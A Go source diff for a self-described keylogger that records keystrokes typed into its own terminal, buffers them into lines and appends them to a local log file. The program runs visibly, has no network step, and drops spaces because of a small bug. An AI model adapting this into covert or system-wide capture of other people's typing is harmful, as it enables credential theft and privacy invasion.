@@ -1,56 +1,69 @@
 package main
 
 import (
+	"fmt"
 	"log"
 	"os"
 	"os/signal"
 	"syscall"
+	"time"
 
 	"github.com/eiannone/keyboard"
 )
 
 func main() {
-	// Open the log file
+	if err := os.MkdirAll("./logs", 0755); err != nil {
+		log.Fatalf("Failed to create log directory: %v", err)
+	}
+
 	logFile, err := os.OpenFile("./logs/keylogger.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		log.Fatalf("Failed to open log file: %v", err)
 	}
 	defer logFile.Close()
 
-	// Configure logger to write to the file
-	log.SetOutput(logFile)
+	logger := log.New(logFile, "", log.LstdFlags)
 
-	// Initialize the keyboard listener
 	if err := keyboard.Open(); err != nil {
 		log.Fatalf("Failed to initialize keyboard listener: %v", err)
 	}
 	defer keyboard.Close()
 
-	log.Println("Keylogger started...")
+	// Log that the keylogger has started
+	logger.Println("Keylogger started...")
+	fmt.Println("Keylogger is running. Press Ctrl+C to stop.")
 
-	// Handle graceful shutdown on system signals
 	signalChan := make(chan os.Signal, 1)
 	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)
 
 	go func() {
+
+		var currentInput string
+
 		for {
-			char, key, err := keyboard.GetKey()
+			char, key, err := keyboard.GetKey() // Get key or character
 			if err != nil {
-				log.Printf("Error reading key: %v", err)
+				logger.Printf("Error reading key: %v", err)
 				continue
 			}
 
-			// Log both key and character
 			if char != 0 {
-				log.Printf("Char: %q", char)
+				currentInput += string(char)
+			} else if key == keyboard.KeyEnter {
+				if len(currentInput) > 0 {
+					logger.Println(currentInput) // Log the complete input
+					currentInput = ""
+				}
+			} else if key == keyboard.KeySpace {
+				currentInput += ""
+			} else if key != 0 {
+				logger.Printf("Key: %v", key)
 			}
-			if key != 0 {
-				log.Printf("Key pressed :%v",key)
-			}
+			time.Sleep(10 * time.Millisecond)
 		}
 	}()
 
-	// Wait for termination signal
-	<-signalChan
-	log.Println("Keylogger shutting down...")
+	sig := <-signalChan
+	logger.Printf("Received signal: %s. Shutting down...", sig)
+	fmt.Println("Keylogger stopped.")
 }
